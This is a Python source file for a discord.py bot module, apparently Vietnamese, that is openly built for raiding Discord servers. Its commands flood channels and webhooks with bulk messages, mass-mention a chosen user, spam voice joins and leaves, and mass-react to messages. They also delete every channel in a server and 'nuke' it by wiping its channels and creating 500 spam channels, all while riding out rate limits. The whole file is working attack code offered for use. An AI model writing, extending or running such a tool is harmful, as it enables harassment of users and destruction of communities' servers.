import discord
from discord.ext import commands
import asyncio
import random
import aiohttp
import os
import pickle
import time

from rate_utils import (
    PROTECTED_GUILD_IDS,
    MIN_SPAM_DELAY,
    MIN_WEBHOOK_DELAY,
    MIN_VOICE_DELAY,
    handle_429_response,
    wait_off_429,
    delete_channel_via_api,
)

class RaidModule(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.is_war = False
        self.api_semaphore = asyncio.BoundedSemaphore(4)

    @commands.Cog.listener()
    async def on_command_error(self, ctx, error):
        if ctx.command is None:
            return
        if isinstance(error, commands.CommandInvokeError) and error.original is not None:
            error = error.original
        if isinstance(error, (commands.MissingRequiredArgument, commands.BadArgument, commands.UserInputError, commands.CommandOnCooldown)):
            await ctx.send(f"❌ Loi: {error}", delete_after=5)
            return
        if isinstance(error, commands.CommandNotFound):
            return
        await ctx.send(f"❌ Loi: {error}", delete_after=5)

    async def handle_rate_limit(self, response):
        return await handle_429_response(response)

    async def delete_cmd(self, ctx):
        """Xoa lenh - da duoc main.py on_message xu ly"""
        pass

    # ================= MENU =================

    @commands.command(name="raid")
    async def _raid_menu(self, ctx):
        p = self.bot.command_prefix
        menu = f"""```ansi
\033[1;31m⚔️ DOMAIN EXPANSION: CHIẾN TRANH ⚔️\033[0m
\033[1;37m**Chọn thuật thức tấn công:**\033[0m

\033[1;35m⚡ SPAM\033[0m
\033[1;30m  {p}vohahan [delay] [text] [count]  \033[1;30m- Spam # 100d/tin\033[0m
\033[1;30m  {p}thuong [delay] [count]          \033[1;30m- ngon.txt 200d/tin\033[0m
\033[1;30m  {p}lienke [delay] [@tag] [count]   \033[1;30m- nhay.txt 1d/tin #\033[0m
\033[1;30m  {p}hacmon [url] [d] [t] [count]    \033[1;30m- Webhook 200d/tin\033[0m

\033[1;34m🔊 VOICE\033[0m
\033[1;30m  {p}ngucmon [id]                    \033[1;30m- Treo Voice\033[0m
\033[1;30m  {p}loanvuc [id] [d]               \033[1;30m- Spam join/leave\033[0m

\033[1;31m🧨 DESTROY\033[0m
\033[1;30m  {p}khaitram                       \033[1;30m- Xóa kênh\033[0m
\033[1;30m  {p}nuke [webhook]                  \033[1;30m- 500 kenh + voice\033[0m
\033[1;30m  {p}anpham [so] [emoji]            \033[1;30m- Reaction spam\033[0m

\033[1;33m⚠️ Gõ {p}ngung để dừng!\033[0m
```"""
        await ctx.send(menu)

    # ================= SPAM COMMANDS =================

    @commands.command(name="vohahan")
    async def _vohahan(self, ctx, delay: float = 0, *, content):
        """Spam voi # prefix - 100 dong/tin. Syntax: .vohahan [delay] [text] [count]"""
        parts = content.rsplit(None, 1)
        count = None
        text = content
        if len(parts) == 2 and parts[1].isdigit():
            text = parts[0]
            count = int(parts[1])

        await self.delete_cmd(ctx)
        self.is_war = True
        sent = 0
        lines = [f"#{text}" for _ in range(100)]
        batch = "\n".join(lines)[:1990]

        while self.is_war:
            if count is not None and sent >= count:
                break
            try:
                await ctx.send(batch)
                sent += 100
                if delay > 0:
                    await asyncio.sleep(delay)
            except discord.HTTPException as e:
                if getattr(e, "status", None) == 429:
                    await wait_off_429(e)
                    continue
                break
            except Exception:
                break

        self.is_war = False
        await ctx.send(
            f"✅ **Vô Hạn** xong! `{sent}` tin | "
            f"Syntax: `.vohahan [delay] [text] [count]`",
            delete_after=5
        )

    @commands.command(name="thuong")
    async def _thuong(self, ctx, delay: float = 0, count: int = None):
        """Spam ngon.txt - 200 dong/tin. Syntax: .thuong [delay] [count]"""
        if not os.path.exists("ngon.txt"):
            return await ctx.send("❌ Thiếu `ngon.txt`!", delete_after=5)

        await self.delete_cmd(ctx)
        self.is_war = True
        try:
            with open("ngon.txt", "r", encoding="utf-8") as f:
                data = [line.strip() for line in f.readlines() if line.strip()]
            if not data:
                return await ctx.send("❌ `ngon.txt` trống!", delete_after=5)

            sent = 0
            while self.is_war:
                if count is not None and sent >= count:
                    break
                lines = [random.choice(data) for _ in range(200)]
                batch = "\n".join(lines)[:1990]
                try:
                    await ctx.send(batch)
                    sent += 200
                    if delay > 0:
                        await asyncio.sleep(delay)
                except discord.HTTPException as e:
                    if getattr(e, "status", None) == 429:
                        await wait_off_429(e)
                        continue
                    break
                except Exception:
                    break

        self.is_war = False
        await ctx.send(
            f"✅ **Thương** xong! `{sent}` tin | "
            f"Syntax: `.thuong [delay] [count]`",
            delete_after=5
        )

    @commands.command(name="lienke")
    async def _lienke(self, ctx, delay: float = 0, member: discord.Member = None, count: int = None):
        """Spam nhay.txt voi # prefix - 1 dong/tin. Syntax: .lienke [delay] [@user] [count]"""
        if not os.path.exists("nhay.txt"):
            return await ctx.send("❌ Thiếu `nhay.txt`!", delete_after=5)

        await self.delete_cmd(ctx)
        self.is_war = True
        try:
            with open("nhay.txt", "r", encoding="utf-8") as f:
                data = [line.strip() for line in f.readlines() if line.strip()]
            if not data:
                return await ctx.send("❌ `nhay.txt` trống!", delete_after=5)

            sent = 0
            while self.is_war:
                if count is not None and sent >= count:
                    break
                msg = f"#{random.choice(data)}"
                target = f"{member.mention} " if member else ""
                full = f"{target}{msg}"[:1990]
                try:
                    await ctx.send(full)
                    sent += 1
                    if delay > 0:
                        await asyncio.sleep(delay)
                except discord.HTTPException as e:
                    if getattr(e, "status", None) == 429:
                        await wait_off_429(e)
                        continue
                    break
                except Exception:
                    break

        self.is_war = False
        await ctx.send(
            f"✅ **Liên Kế** xong! `{sent}` tin | "
            f"Syntax: `.lienke [delay] [@user] [count]`",
            delete_after=5
        )

    @commands.command(name="hacmon")
    async def _hacmon(self, ctx, url: str, delay: float = 0, *, content):
        """Spam webhook 200 dong/tin. Syntax: .hacmon [url] [delay] [text] [count]"""
        parts = content.rsplit(None, 1)
        count = None
        text = content
        if len(parts) == 2 and parts[1].isdigit():
            text = parts[0]
            count = int(parts[1])

        await self.delete_cmd(ctx)
        self.is_war = True
        sent = 0

        async with aiohttp.ClientSession() as session:
            try:
                webhook = discord.Webhook.from_url(url, session=session)
                while self.is_war:
                    if count is not None and sent >= count:
                        break
                    try:
                        lines = [f"{text}" for _ in range(200)]
                        batch = "\n".join(lines)[:1990]
                        await webhook.send(content=batch)
                        sent += 200
                        if delay > 0:
                            await asyncio.sleep(delay)
                    except discord.HTTPException as e:
                        if getattr(e, "status", None) == 429:
                            await wait_off_429(e)
                            continue
                        break
                    except Exception:
                        break
            except Exception as e:
                print(f"Loi hacmon: {e}")

        self.is_war = False
        await ctx.send(
            f"✅ **Hắc Môn** xong! `{sent}` tin | "
            f"Syntax: `.hacmon [url] [delay] [text] [count]`",
            delete_after=5
        )

    @commands.command(name="ngung")
    async def _stop(self, ctx):
        """Dung tat ca thuat thuc"""
        self.is_war = False
        for vc in list(self.bot.voice_clients):
            if vc.guild == ctx.guild and vc.is_connected():
                try:
                    await vc.disconnect()
                except Exception:
                    pass
        await ctx.send("🤞 **GIẢI ẤN!** Dung tat ca thuat thuc.", delete_after=5)

    # ================= VOICE =================

    @commands.command(name="ngucmon")
    async def _ngucmon(self, ctx, id_voice: int):
        """Treo Voice Channel"""
        voice_channel = self.bot.get_channel(id_voice)
        if not voice_channel or not isinstance(voice_channel, discord.VoiceChannel):
            return await ctx.send("❌ Khong tim thay Voice!", delete_after=3)
        try:
            await voice_channel.connect(reconnect=True)
            await ctx.send(f"👁️ **Ngục Môn!** Da phong tai: `{voice_channel.name}`", delete_after=5)
        except Exception as e:
            await ctx.send(f"❌ Loi: {e}", delete_after=3)

    @commands.command(name="loanvuc")
    async def _loanvuc(self, ctx, id_voice: int, delay: float = 0):
        """Spam join/leave Voice"""
        voice_channel = self.bot.get_channel(id_voice)
        if not voice_channel:
            return await ctx.send("❌ Loi Voice ID!", delete_after=5)
        self.is_war = True
        await ctx.send(f"🌀 **LOẠN VỰC!** `{voice_channel.name}`", delete_after=5)
        while self.is_war:
            try:
                vc = await voice_channel.connect()
                if delay > 0:
                    await asyncio.sleep(delay)
                await vc.disconnect()
                if delay > 0:
                    await asyncio.sleep(delay)
            except Exception:
                break

    # ================= REACTION =================

    @commands.command(name="anpham")
    async def _anpham(self, ctx, limit: int, emoji: str):
        """Reaction hang loat"""
        count = 0
        async for message in ctx.channel.history(limit=limit):
            try:
                await message.add_reaction(emoji)
                count += 1
            except discord.HTTPException as e:
                if getattr(e, "status", None) == 429:
                    await wait_off_429(e)
                continue
            except Exception:
                continue
        await ctx.send(f"✅ **Ấn Phẩm** da dong dau `{count}` tin nhan!", delete_after=3)

    # ================= KENH =================

    @commands.command(name="khaitram")
    async def _khaitram(self, ctx):
        """Xoa toan bo kenh"""
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Whitelist!**", delete_after=3)
        channels = [channel.id for channel in ctx.guild.channels]
        if not os.path.exists("trash"):
            os.makedirs("trash")
        with open("trash/channel_ids.pkl", 'wb') as f:
            pickle.dump(channels, f)
        await ctx.send("🛠️ **Khai Trảm!** San phang...", delete_after=5)
        async with aiohttp.ClientSession() as session:
            tasks = [delete_channel_via_api(session, c_id, self.bot.http.token, self.api_semaphore) for c_id in channels]
            await asyncio.gather(*tasks)

    # ================= NUKE =================

    @commands.command(name="nuke")
    async def _nuke(self, ctx, webhook_url: str = None):
        """Nuke: tao 500 kenh vvnk-nuked + voice spam. Syntax: .nuke [webhook]"""
        if ctx.guild.id in PROTECTED_GUILD_IDS:
            return await ctx.send("🛡️ **Whitelist!**", delete_after=3)

        await self.delete_cmd(ctx)
        self.is_war = True
        guild = ctx.guild

        # 1. Xoa tat ca kenh cu
        await ctx.send("🧨 **NUKE** - Dang xoa kenh cu...", delete_after=5)
        channel_ids = [ch.id for ch in guild.channels if ch != ctx.channel]
        async with aiohttp.ClientSession() as session:
            for ch_id in channel_ids:
                if not self.is_war:
                    return
                await delete_channel_via_api(session, ch_id, self.bot.http.token, self.api_semaphore)
                await asyncio.sleep(0.1)

        # 2. Tao 500 kenh vvnk-nuked-1 -> vvnk-nuked-500
        await ctx.send("🛠️ **Tao 500 kenh vvnk-nuked...**", delete_after=5)
        created = 0
        for i in range(1, 501):
            if not self.is_war:
                break
            try:
                await guild.create_text_channel(name=f"vvnk-nuked-{i}")
                created += 1
            except Exception:
                continue

        # 3. Spam webhook vao moi kenh neu co webhook
        if webhook_url and self.is_war:
            await ctx.send("🔥 **Spam webhook vao 500 kenh...**", delete_after=5)
            try:
                async with aiohttp.ClientSession() as session:
                    webhook = discord.Webhook.from_url(webhook_url, session=session)
                    for ch in guild.text_channels:
                        if not self.is_war:
                            break
                        try:
                            lines = [f"NUKED vvnk-{random.randint(1,9999)}" for _ in range(200)]
                            batch = "\n".join(lines)[:1990]
                            await webhook.send(content=batch)
                        except Exception:
                            continue
                        await asyncio.sleep(0.05)
            except Exception:
                pass

        # 4. Voice spam am thanh kho chieu cuong do cuc lon
        if self.is_war:
            await ctx.send("🔊 **VOICE SPAM - Am thanh kho chieu!**", delete_after=5)
            voice_channels = [ch for ch in guild.voice_channels]
            if voice_channels:
                for vc in voice_channels:
                    if not self.is_war:
                        break
                    try:
                        conn = await vc.connect()
                        for _ in range(10):
                            if not self.is_war:
                                break
                            try:
                                await conn.disconnect()
                                await asyncio.sleep(0.2)
                                conn = await vc.connect()
                                await asyncio.sleep(0.2)
                            except Exception:
                                break
                        if conn and conn.is_connected():
                            try:
                                await conn.disconnect()
                            except Exception:
                                pass
                    except Exception:
                        continue

        self.is_war = False
        await ctx.send(
            f"✅ **NUKE HOÀN TÀT!** `{created}` kenh | "
            f"Syntax: `.nuke [webhook]`",
            delete_after=5
        )

async def setup(bot):
    await bot.add_cog(RaidModule(bot))
